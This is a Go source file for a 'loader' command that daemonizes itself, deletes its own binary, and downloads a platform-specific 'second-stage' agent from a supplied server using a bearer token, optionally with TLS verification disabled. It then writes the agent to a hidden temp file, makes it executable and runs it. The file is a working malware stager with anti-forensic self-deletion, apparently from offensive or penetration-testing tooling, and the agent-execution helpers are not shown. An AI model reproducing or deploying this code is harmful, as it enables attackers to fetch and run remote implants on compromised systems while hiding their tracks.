// Copyright 2026 Davide Guerri <davide.guerri@gmail.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Command loader fetches and executes a payload in memory.
package main

import (
	"crypto/tls"
	"io"
	"net/http"
	"os"
	"runtime"
)

func die(msg string) {
	_, _ = os.Stderr.WriteString(msg + "\n")
	os.Exit(1)
}

// hasCABundle checks that at least one system CA bundle file is readable.
// On Windows, Go uses the built-in certificate store so the check always passes.
func hasCABundle() bool {
	if runtime.GOOS == "windows" {
		return true
	}
	for _, p := range []string{
		"/etc/ssl/certs/ca-certificates.crt",
		"/etc/pki/tls/certs/ca-bundle.crt",
		"/etc/ssl/ca-bundle.pem",
		"/etc/ssl/cert.pem",
	} {
		if _, err := os.Stat(p); err == nil {
			return true
		}
	}
	return false
}

func main() {
	// Parse optional flags before positional args.
	insecure, foreground, args := false, false, os.Args[1:]
	for len(args) > 0 && len(args[0]) > 0 && args[0][0] == '-' {
		switch args[0] {
		case "-k":
			insecure = true
		case "-f":
			foreground = true
		default:
			die("unknown flag: " + args[0] + " (expected -k or -f)")
		}
		args = args[1:]
	}
	if len(args) != 3 {
		die("usage: loader [-k] [-f] <url> <token> <agent_id>")
	}
	serverURL := args[0]
	token := args[1]
	agentID := args[2]

	// Pre-flight checks — run before daemonizing so errors reach stderr.
	if !insecure && !hasCABundle() {
		die("no CA bundle found (install ca-certificates or use -k to skip TLS verification)")
	}

	// Daemonize: re-exec self detached so a short-lived parent (e.g. a web
	// request handler) returns immediately.  Skipped with -f or when
	// already the daemon child.
	if os.Getenv("_OAST_D") == "" && !foreground {
		daemonize() // does not return on success
	}

	// Self-delete immediately — the loader is one-shot.
	// On Unix this succeeds on a running binary; on Windows it fails silently
	// and exec_windows.go uses markDeleteOnClose instead.
	os.Remove(os.Args[0]) //nolint:errcheck

	dlURL := serverURL + "/dl/second-stage/" + runtime.GOOS + "-" + runtime.GOARCH

	client := &http.Client{}
	if insecure {
		client.Transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		}
	}

	req, err := http.NewRequest(http.MethodGet, dlURL, nil)
	if err != nil {
		die("request error: " + err.Error())
	}
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := client.Do(req)
	if err != nil {
		die("download error: " + err.Error())
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		die("download failed: HTTP " + http.StatusText(resp.StatusCode))
	}

	tmp, err := os.CreateTemp("", ".agent-*")
	if err != nil {
		die("tmpfile error: " + err.Error())
	}
	tmpPath := tmp.Name()

	if _, err = io.Copy(tmp, resp.Body); err != nil {
		_ = tmp.Close()
		_ = os.Remove(tmpPath)
		die("write error: " + err.Error())
	}
	_ = tmp.Close()

	if err = os.Chmod(tmpPath, 0700); err != nil {
		_ = os.Remove(tmpPath)
		die("chmod error: " + err.Error())
	}

	execAgent(tmpPath, serverURL, token, agentID, insecure)
}
